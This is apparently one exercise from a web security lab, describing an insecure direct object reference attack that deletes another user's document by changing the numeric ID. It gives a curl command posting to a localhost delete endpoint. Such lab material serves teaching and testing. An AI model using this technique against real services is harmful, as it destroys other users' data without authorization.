## 16 - IDOR: document deletion

### Goal
Delete another user’s document by changing the numeric document ID.

### Endpoint
- `POST http://127.0.0.1:4000/documents/:id/delete`

### Example

```bash
curl -s \
  -H "Authorization: Bearer <TOKEN>" \
  -X POST http://127.0.0.1:4000/documents/1/delete
```

